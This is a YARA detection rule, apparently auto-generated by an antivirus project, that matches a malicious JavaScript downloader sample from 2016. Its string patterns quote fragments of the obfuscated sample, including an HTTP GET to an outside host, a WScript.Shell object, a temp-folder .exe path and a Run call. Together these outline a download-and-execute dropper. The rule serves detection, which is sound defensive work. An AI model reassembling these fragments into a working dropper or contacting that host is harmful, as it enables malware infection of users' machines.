rule sig_20160330_7919f9b9d6b814e0644756e20599a5a6 {
  meta:
    description = "datamaliciousorder - file 20160330_7919f9b9d6b814e0644756e20599a5a6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "288a2c3280a5ca522035f62a48d56bbf66f0fc231091ccb2fa37131ebf3de5a0"

  strings:
    $s1  = "_I[_S](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "function _N(_Q0, _K0){_F = _F * 1; return _Q0 - _K0;};" fullword ascii
    $s3  = "var _Q = function _DK() {return WScript[_ZX](\"WScript\"+\".Shell\");}(), _FA = 11;" fullword ascii
    $s4  = "if (_I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _T0(){return _EX + \"\";};" fullword ascii
    $s6  = "function _T() {return _Q[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gKv4gOX3GmGAlie.ex\" + \"e\";};" fullword ascii
    $s7  = "function _B(_AI){_Q[\"Run\"](_AI, _F, _F);};" fullword ascii
    $s8  = "function _TF() {return ((_T1 == true) && (_T1 == _JI)) ? 1 : _F;};" fullword ascii
    $s9  = " while (_X){" fullword ascii
    $s10 = "return _N(_YJ, _TE);" fullword ascii
    $s11 = "function _CF(){return _ZX;};" fullword ascii
    $s12 = "function _XN()" fullword ascii
    $s13 = "function _D(_O) {var _N0 = (1, 2, 3, 4, 5, _O); return _N0;};" fullword ascii
    $s14 = "function _GC(){return 22;};" fullword ascii
    $s15 = "var _QD = new this[\"Date\"]();" fullword ascii
    $s16 = "var _II = false;" fullword ascii
    $s17 = "var _T1 = false;" fullword ascii
    $s18 = "var _JI = false;" fullword ascii
    $s19 = "_JI = true; " fullword ascii
    $s20 = "_T1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}